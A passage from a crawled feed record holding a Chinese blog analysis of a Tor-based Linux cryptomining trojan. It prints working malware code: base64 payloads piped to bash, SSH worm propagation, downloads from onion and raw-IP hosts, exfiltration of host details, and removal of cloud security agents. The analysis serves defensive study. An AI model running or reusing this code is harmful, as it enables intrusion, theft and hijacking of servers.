KQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash'</span>\npssh <span class=\"s1\">'echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash'</span>\n<span class=\"nv\">hosts</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">grep</span> <span class=\"nt\">-oE</span> <span class=\"s2\">\"</span><span class=\"se\">\\b</span><span class=\"s2\">([0-9]{1,3}</span><span class=\"se\">\\.</span><span class=\"s2\">){3}[0-9]{1,3}</span><span class=\"se\">\\b</span><span class=\"s2\">\"</span> ~/.bash_history /etc/hosts ~/.ssh/known_hosts |grep <span class=\"nt\">-v</span> ^127.|awk <span class=\"nt\">-F</span>: <span class=\"o\">{</span><span class=\"s1\">'print $2'</span><span class=\"o\">}</span>|sort|uniq<span class=\"si\">)</span>\n<span class=\"k\">for </span>h <span class=\"k\">in</span> <span class=\"nv\">$hosts</span><span class=\"p\">;</span><span class=\"k\">do </span>ssh <span class=\"nt\">-oBatchMode</span><span class=\"o\">=</span><span class=\"nb\">yes</span> <span class=\"nt\">-oConnectTimeout</span><span class=\"o\">=</span>5 <span class=\"nt\">-oPasswordAuthentication</span><span class=\"o\">=</span>no <span class=\"nt\">-oPubkeyAuthentication</span><span class=\"o\">=</span><span class=\"nb\">yes</span> <span class=\"nt\">-oStrictHostKeyChecking</span><span class=\"o\">=</span>no <span class=\"nt\">-l</span> root  <span class=\"nv\">$h</span> <span class=\"s1\">'echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash'</span><span class=\"p\">;</span><span class=\"k\">done\nfor </span>h <span class=\"k\">in</span> <span class=\"nv\">$hosts</span><span class=\"p\">;</span><span class=\"k\">do </span>ssh <span class=\"nt\">-oBatchMode</span><span class=\"o\">=</span><span class=\"nb\">yes</span> <span class=\"nt\">-oConnectTimeout</span><span class=\"o\">=</span>5 <span class=\"nt\">-oPasswordAuthentication</span><span class=\"o\">=</span>no <span class=\"nt\">-oPubkeyAuthentication</span><span class=\"o\">=</span><span class=\"nb\">yes</span> <span class=\"nt\">-oStrictHostKeyChecking</span><span class=\"o\">=</span>no <span class=\"nt\">-l</span> <span class=\"nv\">$USER</span> <span class=\"nv\">$h</span> <span class=\"s1\">'echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash'</span><span class=\"p\">;</span><span class=\"k\">done</span>\n<span class=\"o\">}</span>\n\nibot<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"nv\">f</span><span class=\"o\">=</span>/bot\n<span class=\"nv\">r</span><span class=\"o\">=</span><span class=\"si\">$(</span>curl <span class=\"nt\">-4fsSLk</span> ip.sb||wget <span class=\"nt\">-4qO-</span> ip.sb||curl <span class=\"nt\">-4fsSLk</span> checkip.amazonaws.com<span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">whoami</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-n</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>crontab <span class=\"nt\">-l</span>|base64 <span class=\"nt\">-w0</span><span class=\"si\">)</span>\n<span class=\"nv\">$c</span> <span class=\"nt\">-x</span> socks5h://<span class=\"nv\">$s</span>:9050 <span class=\"nt\">-e</span><span class=\"nv\">$r</span> <span class=\"nv\">$t</span>.onion<span class=\"nv\">$f</span> <span class=\"o\">||</span> <span class=\"nv\">$c</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span> <span class=\"nv\">$1$f</span>\n<span class=\"o\">}</span>\n\niscn<span class=\"o\">()</span> <span class=\"o\">{</span>\npkill <span class=\"nt\">-9</span> <span class=\"nt\">-f</span> tracepath\n<span class=\"nv\">f</span><span class=\"o\">=</span>/trc\n<span class=\"nv\">x</span><span class=\"o\">=</span>./<span class=\"si\">$(</span><span class=\"nb\">date</span>|md5sum|cut <span class=\"nt\">-f1</span> <span class=\"nt\">-d-</span><span class=\"si\">)</span>\n<span class=\"nv\">$c</span> <span class=\"nt\">-x</span> socks5h://<span class=\"nv\">$s</span>:9050 <span class=\"nv\">$t</span>.onion<span class=\"nv\">$f</span> <span class=\"nt\">-o</span><span class=\"nv\">$x</span> <span class=\"o\">||</span> <span class=\"nv\">$c</span> <span class=\"nv\">$1$f</span> <span class=\"nt\">-o</span><span class=\"nv\">$x</span>\n<span class=\"nb\">chmod</span> +x <span class=\"nv\">$x</span><span class=\"p\">;</span><span class=\"nv\">$x</span><span class=\"p\">;</span><span class=\"nb\">rm</span> <span class=\"nt\">-f</span> <span class=\"nv\">$x</span>\n<span class=\"o\">}</span>\n\nsockz\nfexe\nisys\nissh &amp;\nibot <span class=\"nv\">$t</span>.tor2web.in <span class=\"o\">||</span> ibot <span class=\"nv\">$t</span>.tor2web.it\niscn <span class=\"nv\">$t</span>.tor2web.in <span class=\"o\">||</span> iscn <span class=\"nv\">$t</span>.tor2web.it\n\n\n</code></pre></div></div>\n\n<p>这里面的  isys 试图卸载国内的的阿里云和腾讯云的 HIDS，但是却没有看到针对国外的厂商的 HIDS 的卸载程序。 这说明攻击者要么是国人，只了解国内的情况，要么攻击目标是国内的机器。</p>\n\n<p>但是看到有很多篇英文的分析文章，说明这个攻击者还是要攻击国外的机器的。</p>\n\n<p>那么为什么只卸载国内云服务器的 HIDS 呢，那我不知道了。</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>isys<span class=\"o\">()</span> <span class=\"o\">{</span> \n<span class=\"nb\">echo </span>ZnVuY3Rpb24ga3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOnKICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCnJtIC1mICRIT01FL3NzCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzUuMC9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvY3VybCA+ICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApzcyAtdiAgIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvc3MgICA+ICRIT01FL3NzO2NobW9kICt4ICRIT01FL3NzCnNzIC12ICAgfHwgY3VybCAtcyBodHRwOi8vMTM5LjU5LjE1MC43OjQ0My9zcyAtbyAkSE9NRS9zcztjaG1vZCAreCAkSE9NRS9zcwpwcyAgICAgIHx8IGN1cmwgLXMgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvcHMgLW8gJEhPTUUvcHM7Y2htb2QgK3ggJEhPTUUvcHMK|base64 <span class=\"nt\">-d</span>|bash\ncrontab <span class=\"nt\">-l</span> <span class=\"o\">||</span> yum <span class=\"nt\">-y</span> <span class=\"nb\">install </span>cron\ncrontab <span class=\"nt\">-l</span> <span class=\"o\">||</span> yum <span class=\"nt\">-y</span> <span class=\"nb\">install </span>cronie\ncrontab <span class=\"nt\">-l</span> <span class=\"o\">||</span> apt-get update <span class=\"o\">&amp;&amp;</span> apt-get <span class=\"nt\">-y</span> <span class=\"nb\">install </span>cron\n/usr/local/share/assist-daemon/assist_daemon <span class=\"nt\">--stop</span>\n/usr/local/share/assist-daemon/assist_daemon <span class=\"nt\">--delete</span>\n/usr/local/qcloud/monitor/barad/admin/uninstall.sh\n/usr/local/qcloud/stargate/admin/uninstall.sh\n/usr/local/qcloud/YunJing/uninst.sh\n/etc/init.d/aegis uninstall\nsystemctl stop aliyun\nsystemctl disable aliyun\nsystemctl start cron\nsystemctl <span class=\"nb\">enable </span>cron\nsystemctl start crond\nsystemctl <span class=\"nb\">enable </span>crond\n<span class=\"nb\">rm</span> <span class=\"nt\">-rf</span> /usr/loca/qcloud/ /usr/local/aegis/ /usr/local/share/assist-daemon/ /usr/local/share/aliyun-assist/ /usr/sbin/aliyun-service /usr/sbin/aliyun_installer /etc/systemd/system/aliyun.service\n<span class=\"o\">}</span>\n\n</code></pre></div></div>\n\n<p><code class=\"language-plaintext highlighter-rouge\">issh</code>函数通过 ssh横向移动。 如果机器上有已经配置好的 <a href=\"https://github.com/ansible/ansible\">ansible</a>、<a href=\"https://github.com/lilydjwg/pssh\">pssh</a>、<a href=\"https://github.com/saltstack/salt\">salt</a>、<a href=\"https://docs.chef.io/workstation/knife_bootstrap/\">knife</a> 等自动化运维工具，该恶意程序还会尝试利用他们进行横向移动。除此之外，攻击者还从 bash 的历史 ssh 记录里面尝试登录远程设备。</p>\n\n<h1 id=\"跋\">跋</h1>\n\n<p>攻击者看起来是花了一些精力来研究如何绕过 HIDS 和 NIDS 的，恶意木马至今还有一部分是免杀的，此外还通过 IaC 工具扩大自己的战果，如此看来攻击者还是很厉害的，虽然没有做太多的对抗，但是他横向移动的技术值得红队人员学习 :)</p>\n\n<p>分析大概就写这么多吧。</p>\n\n<p>又是一篇流水账，没有重点，缺乏组织的意识流形式的文章。</p>\n\n<p>我觉得这样不好，还得多学习学习怎样行文才能结构紧凑，言之有物。</p>\n\n<p>看起来应该在本文的基础上修改几遍应该是可以改出来的。</p>\n\n<p>不过吧，这不是写作业，没人评分，但是读者读起来可能比较费劲。</p>\n\n<p>大段的代码，没有介绍基础知识，溯源思路没有表达清楚，大段的原始冗余重复的代码，缺乏图片描述，彼此关系不清，没有 Linux 基础的人可能很难看懂，能看懂的可能也很难坚持看这无聊的文章到结尾，最后此文可能就变成了我的备忘录 :(</p>\n\n<p>想了想，我下次还是得认真思考一下怎么表达才能比较清楚了。</p>\n\n<p>这一篇就算了，就写这样了吧。</p>\n\n<p>哎，就是玩。</p>\n\n<p>鸣谢：</p>\n\n<ul>\n  <li>曾大佬</li>\n  <li>矫哥</li>\n</ul>\n\n<p>Les1ie</p>\n\n<p>2021.7.12 18:43</p>\n","descriptionType":"text/html","publishedDate":"Mon, 12 Jul 2021 10:53:00 +0000","feedId":44106,"bgimg":"https://static.scuseek.com/20210712164644.png","linkMd5":"409eb4b5994f32bbf704ffdbf638fb5f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn86@2020_1/2022/03/14/10-35-38-330_0e0bfe13ba5fd394.webp","destWidth":1263,"destHeight":389,"sourceBytes":20501,"destBytes":13498,"author":"","articleImgCdnMap":{"https://static.scuseek.com/20210712164644.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn86@2020_1/2022/03/14/10-35-38-330_0e0bfe13ba5fd394.webp","https://static.scuseek.com/20210712165007.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn100@2020_1/2022/03/14/10-35-41-041_8009b5ab3ffd5826.webp","https://static.scuseek.com/20210713162517.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn29@2020_1/2022/03/14/10-35-41-007_c0f697ae4a827df8.webp","https://static.scuseek.com/20210712152849.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn26@2020_3/2022/03/14/10-35-41-017_76ee5e19e147c37e.webp","https://static.scuseek.com/20210712153642.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn3@2020_4/2022/03/14/10-35-44-482_6ae6730984506252.webp","https://static.scuseek.com/20210712153744.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn16@2020_6/2022/03/14/10-35-41-504_b565567ffbec502c.webp","https://static.scuseek.com/20210712154430.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn41@2020_5/2022/03/14/10-35-41-853_e79bced238db345e.webp","https://static.scuseek.com/20210712154419.png":null,"https://static.scuseek.com/20210712155201.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn12@2020_3/2022/03/14/10-35-40-484_723d94ac9fad8d11.webp","https://static.scuseek.com/20210712155342.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn19@2020_3/2022/03/14/10-35-40-947_25f8792c18b6cffd.webp","https://static.scuseek.com/20210712171324.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn90@2020_3/2022/03/14/10-35-42-691_dc94e1fe5d9ad0d9.webp","https://static.scuseek.com/20210712171854.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn8@2020_3/2022/03/14/10-35-41-466_0531a9e24ff79c7c.webp","https://static.scuseek.com/20210712193241.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn95@2020_5/2022/03/14/10-35-43-214_66d0afd231e2c44c.webp","https://static.scuseek.com/20210712165241.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn34@2020_2/2022/03/14/10-35-41-303_f52859bc551c13f5.webp","https://static.scuseek.com/20210712170908.png":null},"publishedOrCreatedDate":1647254136179}],"record":{"createdTime":"2022-03-14 18:35:36","updatedTime":"2022-03-14 18:35:36","feedId":44106,"fetchDate":"Mon, 14 Mar 2022 10:35:36 +0000","fetchMs":54,"handleMs":65,"totalMs":66228,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"245d88d7b2d8f26704713c23b090d029","hostName":"us-031*","requestId":"7b832bc5c3f64b428e50c6324e75acdc_44106","contentType":"application/xml","totalBytes":962922,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":15,"articlesImgsGithubTotal":13,"successGithubMap":{"myreaderx8":1,"myreaderx27":1,"myreaderx4":1,"myreaderx10":1,"myreaderx12":1,"myreaderx2":1,"myreaderx13":1,"myreaderx24":1,"myreaderx1":1,"myreaderx30":1,"myreaderx29":1,"myreaderx18":1,"myreaderx":1},"failGithubMap":{"myreaderx23":1,"myreaderx31":1}},"feed":{"createdTime":"2020-09-07 03:33:30","updatedTime":"2020-09-07 05:51:17","id":44106,"name":"Les1ie","url":"https://les1ie.com/feed.xml","subscriber":72,"website":null,"icon":"https://iansmith123.github.io/img/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx63/cdn93@2020_4/2020/09/06/21-51-09-437_62b0f48fa1d2d3eb.ico","description":"行百里者半九十。","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2022-03-14 18:36:42","updatedTime":"2022-03-14 18:36:42","id":null,"feedId":44106,"linkMd5":"409eb4b5994f32bbf704ffdbf638fb5f"}],"tmpCommonImgCdnBytes":13498,"tmpBodyImgCdnBytes":949424,"tmpBgImgCdnBytes":0,"extra4":{"start":1647254135894,"total":0,"statList":[{"spend":229,"msg":"获取xml内容"},{"spend":65,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":63506,"msg":"正文链接上传到cdn"}]},"extra5":15,"extra6":15,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712154419.png","sourceStatusCode":200,"destWidth":1194,"destHeight":447,"sourceBytes":71364,"destBytes":92940,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":3593,"convertSpendMs":76,"createdTime":"2022-03-14 18:35:38","host":"us-54*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx31/cdn38/contents/2022/03/14/10-35-42-201_aad46fb3510c6909.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69855631.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, X-GitHub-SSO, X-GitHub-Request-Id, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Mon, 14 Mar 2022 10:35:42 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["E516:1F8E:2AE96C9:84D330D:622F1A7E"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1647256480"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["61"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx31/cdn38/contents/2022/03/14/10-35-42-201_aad46fb3510c6909.webp","historyStatusCode":[],"spendMs":34},"base64UserPassword":null,"token":"da243******************************d9e47"},"githubUser":"myreaderx31","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"69.7 KB","destSize":"90.8 KB","compressRate":"130.2%"},{"code":1,"isDone":false,"source":"https://static.scuseek.com/20210712154419.png","sourceStatusCode":200,"destWidth":1194,"destHeight":447,"sourceBytes":71364,"destBytes":92940,"targetWebpQuality":75,"feedId":44106,"totalSpendMs":2272,"convertSpendMs":37,"createdTime":"2022-03-14 18:35:42","host":"europe-23*","referer":"https://iansmith123.github.io/2021/07/12/tor-miner/","linkMd5ListStr":"409eb4b5994f32bbf704ffdbf638fb5f","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx31/cdn38/contents/2022/03/14/10-35-44-308_aad46fb3510c6909.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69855631.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, 